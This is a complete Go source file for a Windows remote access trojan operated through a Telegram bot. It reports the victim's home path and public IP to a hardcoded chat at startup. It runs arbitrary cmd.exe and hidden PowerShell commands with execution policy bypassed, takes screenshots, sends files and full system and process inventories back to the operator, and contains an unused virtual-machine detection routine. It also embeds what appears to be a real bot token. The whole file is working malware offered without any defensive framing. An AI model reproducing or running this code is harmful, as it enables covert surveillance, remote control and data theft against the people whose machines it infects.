package main

import (
	"fmt"
	"image/png"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/kbinani/screenshot"
	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/disk"
	"github.com/shirou/gopsutil/host"
	"github.com/shirou/gopsutil/mem"
	"github.com/shirou/gopsutil/net"
	"github.com/shirou/gopsutil/process"
)

// ///////////////////////////////////////////////////////////////////////////
// #emulator check
func isEmulatedEnvironment() bool {
	// Common VM vendors
	suspectVendors := []string{
		"Microsoft Corporation", // Hyper-V
		"VMware",                // VMware
		"VirtualBox",            // Oracle
		"Xen",                   // Xen
		"QEMU",                  // QEMU
		"Parallels",             // Parallels
	}

	// Check BIOS vendor
	biosVendorPath := "HARDWARE\\DESCRIPTION\\System"
	biosVendor, err := readRegistryValue("HKLM", biosVendorPath, "SystemBiosVersion")
	if err == nil {
		for _, vendor := range suspectVendors {
			if strings.Contains(strings.ToLower(biosVendor), strings.ToLower(vendor)) {
				return true
			}
		}
	}

	// Optionally check for MAC addresses or system product names too...

	return false
}

func readRegistryValue(root, path, name string) (string, error) {
	cmd := exec.Command("reg", "query", root+"\\"+path, "/v", name)
	out, err := cmd.Output()
	if err != nil {
		return "", err
	}
	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		if strings.Contains(line, name) {
			fields := strings.Fields(line)
			if len(fields) >= 3 {
				return strings.Join(fields[2:], " "), nil
			}
		}
	}
	return "", fmt.Errorf("value not found")
}

// ####################################################################################################
func pwrcmd(code string) (string, error) {
	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", code)

	// Hide PowerShell window
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	out, err := cmd.CombinedOutput()
	return string(out), err
}

// Function to pop up a message box with given text
func saymsg(text string) {
	ps := fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("%s")`, text)
	pwrcmd(ps)
}

//###################################################################################################333

const (
	BOT_TOKEN     = "7727386095:AAGch9a1EMA72xtZUW6TVdegJx_TuWbLEvk"
	STARTUP_CHAT  = 5441972884
	IMG_DIR       = "imgdat"
	MAX_MSG_BYTES = 4096
)

var cwd string

func init() {
	var err error
	cwd, err = os.Getwd()
	if err != nil {
		log.Fatalf("Failed to get cwd: %v", err)
	}
	os.MkdirAll(IMG_DIR, 0755)
}

func captureScreen() (string, error) {
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return "", err
	}
	ts := time.Now().Format("20060102150405")
	file := fmt.Sprintf("%s.png", ts)
	path := filepath.Join(IMG_DIR, file)
	f, err := os.Create(path)
	if err != nil {
		return "", err
	}
	defer f.Close()
	png.Encode(f, img)
	return path, nil
}

func getOSInfo() string {
	pi, _ := host.Info()
	return fmt.Sprintf("[+] OS Version: %s %s", pi.Platform, pi.PlatformVersion)
}

func getSystemInfo() string {
	hi, _ := host.Info()
	return fmt.Sprintf("\n==== SYSTEM INFO ====\n[+] Hostname: %s\n    Uptime: %d seconds",
		hi.Hostname, hi.Uptime)
}

func getCPUInfo() string {
	infos, _ := cpu.Info()
	perc, _ := cpu.Percent(time.Second, true)
	sb := strings.Builder{}
	sb.WriteString("\n==== CPU INFO ====")
	if len(infos) > 0 {
		sb.WriteString(fmt.Sprintf("\n[+] Model: %s", infos[0].ModelName))
	}
	for i, p := range perc {
		sb.WriteString(fmt.Sprintf("\n    Core %d: %.2f%%", i, p))
	}
	return sb.String()
}

func getRAMInfo() string {
	v, _ := mem.VirtualMemory()
	return fmt.Sprintf("\n==== RAM INFO ====\n[+] Total: %v MB\n    Used: %v MB (%.2f%%)",
		v.Total/1024/1024, v.Used/1024/1024, v.UsedPercent)
}

func getDiskInfo() string {
	parts, _ := disk.Partitions(false)
	sb := strings.Builder{}
	sb.WriteString("\n==== DISK INFO ====")
	for _, p := range parts {
		u, err := disk.Usage(p.Mountpoint)
		if err != nil {
			continue
		}
		sb.WriteString(fmt.Sprintf("\n[+] %s: %.2f/%.2f GB (%.2f%%)",
			p.Device, float64(u.Used)/1e9, float64(u.Total)/1e9, u.UsedPercent))
	}
	return sb.String()
}

func getNetworkInfo() string {
	ifaces, _ := net.Interfaces()
	sb := strings.Builder{}
	sb.WriteString("\n==== NETWORK INFO ====")
	for _, iface := range ifaces {
		sb.WriteString(fmt.Sprintf("\n[+] %s", iface.Name))
		for _, addr := range iface.Addrs {
			sb.WriteString(fmt.Sprintf("\n    %s", addr.Addr))
		}
	}
	resp, err := http.Get("https://api.ipify.org")
	if err == nil {
		b, _ := ioutil.ReadAll(resp.Body)
		sb.WriteString(fmt.Sprintf("\n[+] Public IP: %s", string(b)))
		resp.Body.Close()
	} else {
		sb.WriteString("\n[!] Failed to fetch public IP")
	}
	return sb.String()
}

func getBatteryInfo() string {
	return "\n==== BATTERY INFO ====\n[!] Not supported on Windows"
}

func getTemperatureInfo() string {
	return "\n==== TEMPERATURE INFO ====\n[!] Not supported on Windows"
}

func getProcessInfo() string {
	ps, _ := process.Processes()
	sb := strings.Builder{}
	sb.WriteString("\n==== PROCESS INFO ====")
	for _, p := range ps {
		name, _ := p.Name()
		cpuP, _ := p.CPUPercent()
		memP, _ := p.MemoryPercent()
		sb.WriteString(fmt.Sprintf("\n[+] PID:%d %s CPU:%.2f%% MEM:%.2f%%",
			p.Pid, name, cpuP, memP))
	}
	return sb.String()
}

func getAllSystemInfo() string {
	return getOSInfo() +
		getSystemInfo() +
		getCPUInfo() +
		getRAMInfo() +
		getDiskInfo() +
		getNetworkInfo() +
		getBatteryInfo() +
		getTemperatureInfo() +
		getProcessInfo()
}

func sendLargeMessage(bot *tgbotapi.BotAPI, chatID int64, text string) {
	if text == "" {
		text = "[+] Done with no output."
	}
	for i := 0; i < len(text); i += MAX_MSG_BYTES {
		end := i + MAX_MSG_BYTES
		if end > len(text) {
			end = len(text)
		}
		bot.Send(tgbotapi.NewMessage(chatID, text[i:end]))
	}
}

func main() {
	var bot *tgbotapi.BotAPI
	var err error
	log.Println("Starting bot...")
	// Retry loop for bot initialization
	for {
		bot, err = tgbotapi.NewBotAPI(BOT_TOKEN)
		if err == nil {
			break
		}
		log.Printf("Bot init failed: %v. Retrying in 5 seconds...", err)
		time.Sleep(5 * time.Second) // Retry after 5 seconds
	}

	// ensure polling works
	_, err = bot.Request(tgbotapi.DeleteWebhookConfig{})
	if err != nil {
		log.Printf("⚠️ could not delete webhook: %v", err)
	}

	// send startup info
	user, _ := os.UserHomeDir()
	resp, err := http.Get("https://api.ipify.org?format=text")
	ip := "No IP"
	if err == nil {
		b, _ := ioutil.ReadAll(resp.Body)
		ip = string(b)
		resp.Body.Close()
	}
	bot.Send(tgbotapi.NewMessage(STARTUP_CHAT,
		fmt.Sprintf("%s %s %s",
			user, ip,
			time.Now().Format("Jan 02, 2006 03:04:05 PM"),
		)))

	updates := bot.GetUpdatesChan(tgbotapi.NewUpdate(0))

	for update := range updates {
		if update.Message == nil {
			continue
		}
		txt := strings.TrimSpace(update.Message.Text)
		cid := update.Message.Chat.ID

		switch {
		case txt == "/start":
			bot.Send(tgbotapi.NewMessage(cid, "Hey there! I'm your Go bot. Type /help."))
		case txt == "/help":
			bot.Send(tgbotapi.NewMessage(cid,
				"Commands:\n"+
					"/start\n"+
					"/help\n"+
					"scrcap\n"+
					"info\n"+
					"download\n"+
					"cmd <command>"))
		case strings.EqualFold(txt, "scrcap"):
			bot.Send(tgbotapi.NewMessage(cid, "Capturing screen..."))
			path, err := captureScreen()
			if err != nil {
				bot.Send(tgbotapi.NewMessage(cid, "[!] Screenshot failed: "+err.Error()))
				break
			}
			bot.Send(tgbotapi.NewMessage(cid, "Capture complete, sending file..."))
			bot.Send(tgbotapi.NewPhoto(cid, tgbotapi.FilePath(path)))
			// inside your switch{ ... }
		case strings.HasPrefix(strings.ToLower(txt), "download "):
			// extract filename after the keyword
			fileName := strings.TrimSpace(txt[len("download "):])
			fullPath := filepath.Join(cwd, fileName)

			// check if it exists
			if _, err := os.Stat(fullPath); os.IsNotExist(err) {
				bot.Send(tgbotapi.NewMessage(cid, "[-] File not found: "+fileName))
				break
			}

			// upload as a document
			bot.Send(tgbotapi.NewMessage(cid, "[+] Uploading "+fileName+"…"))
			doc := tgbotapi.NewDocument(cid, tgbotapi.FilePath(fullPath))
			if _, err := bot.Send(doc); err != nil {
				bot.Send(tgbotapi.NewMessage(cid, "[!] Upload failed: "+err.Error()))
			}

		case strings.EqualFold(txt, "info"):
			sendLargeMessage(bot, cid, getAllSystemInfo())
		case strings.HasPrefix(strings.ToLower(txt), "msg "):
			msgText := strings.TrimSpace(txt[4:])
			go saymsg(msgText)
			bot.Send(tgbotapi.NewMessage(cid, "[+] Msg shown"))

		case strings.HasPrefix(strings.ToLower(txt), "pwcmd "):
			pwcmdStr := strings.TrimSpace(txt[6:])
			out, err := pwrcmd(pwcmdStr)
			if err != nil {
				sendLargeMessage(bot, cid, "[!] "+err.Error()+"\n"+string(out))
			} else {
				sendLargeMessage(bot, cid, string(out))
			}
		case strings.HasPrefix(strings.ToLower(txt), "cmd "):
			cmdStr := strings.TrimSpace(txt[4:])
			if strings.HasPrefix(strings.ToLower(cmdStr), "cd ") {
				// handle cd with absolute paths
				target := strings.Trim(cmdStr[3:], `" `)
				newDir := filepath.Join(cwd, target)
				abs, err := filepath.Abs(newDir)
				if err != nil {
					bot.Send(tgbotapi.NewMessage(cid, "[!] Invalid path: "+err.Error()))
					continue
				}
				if fi, err := os.Stat(abs); err == nil && fi.IsDir() {
					cwd = abs
					bot.Send(tgbotapi.NewMessage(cid, "[+] Changed dir to "+cwd))
				} else {
					bot.Send(tgbotapi.NewMessage(cid, "[-] Dir not found: "+target))
				}
				continue
			}
			// drop into cmd.exe for everything else (native expands %CD%, supports built-ins)
			cmd := exec.Command("cmd.exe", "/C", cmdStr)
			cmd.Dir = cwd
			out, err := cmd.CombinedOutput()
			if err != nil {
				sendLargeMessage(bot, cid, "[!] "+err.Error()+"\n"+string(out))
			} else {
				sendLargeMessage(bot, cid, string(out))
			}
		default:
			bot.Send(tgbotapi.NewMessage(cid, "I don't get that. Try /help"))
		}
	}
}
